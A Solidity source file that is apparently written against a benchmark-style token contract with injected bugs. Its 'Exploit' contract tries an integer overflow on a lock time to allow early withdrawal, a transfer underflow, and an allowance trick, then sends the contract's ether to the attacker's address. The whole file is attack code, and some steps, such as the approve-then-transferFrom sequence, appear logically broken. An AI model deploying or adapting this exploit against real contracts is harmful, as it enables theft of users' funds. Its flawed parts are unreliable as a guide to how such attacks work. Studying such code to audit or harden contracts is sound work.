interface VulnerableToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function approve(address _spender, uint256 _value) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
    function increaseLockTime_intou1(uint _secondsToIncrease) external;
    function withdraw_ovrflow1() external;
}

contract Exploit {
    VulnerableToken public vulnerableToken;
    address public attacker;

    constructor(address _vulnerableTokenAddress) {
        vulnerableToken = VulnerableToken(_vulnerableTokenAddress);
        attacker = msg.sender;
    }

    function exploitOverflow() external {
        require(msg.sender == attacker);
        vulnerableToken.increaseLockTime_intou1(type(uint256).max);
        vulnerableToken.withdraw_ovrflow1();
    }

    function exploitUnderflow() external {
        require(msg.sender == attacker);
        vulnerableToken.transfer(address(0), 1);
    }

    function exploitApproval() external {
        require(msg.sender == attacker);
        vulnerableToken.approve(address(this), type(uint256).max);
        vulnerableToken.transferFrom(attacker, address(this), 1);
    }

    function withdraw() external {
        require(msg.sender == attacker);
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {}
}